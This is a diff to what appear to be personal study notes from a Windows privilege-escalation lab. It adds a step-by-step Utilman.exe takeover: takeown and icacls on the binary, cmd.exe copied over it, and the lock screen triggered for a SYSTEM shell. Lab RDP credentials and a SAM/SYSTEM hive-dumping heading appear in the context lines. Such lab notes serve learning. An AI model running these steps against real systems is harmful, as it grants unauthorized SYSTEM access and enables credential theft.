@@ -478,7 +478,7 @@ nt authority\system
   * Ignores any DACL in place.
 * Rationale is to allow certain users to perform backups without requiring full admin rights.
 * Attacker can trivially escalate privileges with these privileges.
-### Copy SAM and SYSTEM registry hives to extract Administrator's password hash example.
+### Copy SAM and SYSTEM registry hives to extract Administrator's password hash
 #### 1. RDP to target.
 ```
 xfreerdp /u:THMBackup /p:CopyMaster555 /v:10.10.21.86
@@ -549,7 +549,60 @@ nt authority\system
 * Allows user to take ownership of any object on a system.
 * Opens up many possibilities for an attacker to elevate privileges.
   * E.g. Take ownership of a service's executable that is running as SYSTEM.
-* 
+### Abuse `utilman.exe` to escalate privileges
+* Utilman is built-in Window app used to provide Ease of Access options during lock screen.
+* Runs with SYSTEM privileges.
+#### 1. RDP to target machine.
+```
+xfreerdp /u:THMTakeOwnership /P:TheWorldIsMine2022 /v:10.10.33.51
+```
+#### 2. Open command prompt using "Open as administrator" to get the SeTakeOwnership privilege.
+* Check privileges.
+```
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                              State
+============================= ======================================== ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
+``` 
+#### 3. Take ownership of utilman.
+```
+takeown /f C:\Windows\System32\Utilman.exe
+
+SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership"
+```
+#### 4. Assign owner account full privileges on file.
+```
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+processed file: Utilman.exe
+Successfully processed 1 files; Failed processing 0 files
+```
+#### 5. Replace utilman.exe with copy of cmd.exe.
+```
+cd c:\Windows\System32\
+copy utilman.exe %temp%
+        1 file(s) copied.
+copy cmd.exe utilman.exe
+Overwrite Utilman.exe (Yes/No/All): yes
+        1 file(s) copied.
+```
+#### 6. Trigger utilman by locking screen.
+* Click on "Ease of Access" button.
+* Runs cmd.exe with SYSTEM privileges.
+```
+The system cannot find message text for message number 0x2350 in the message file for Application.
+
+(c) 2018 Microsoft Corporation. All rights reserved.
+Not enough memory resources are available to process this command.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
 ## SeImpersonate / SeAssignPrimaryToken
 
 # Abusing Vulnerable Software
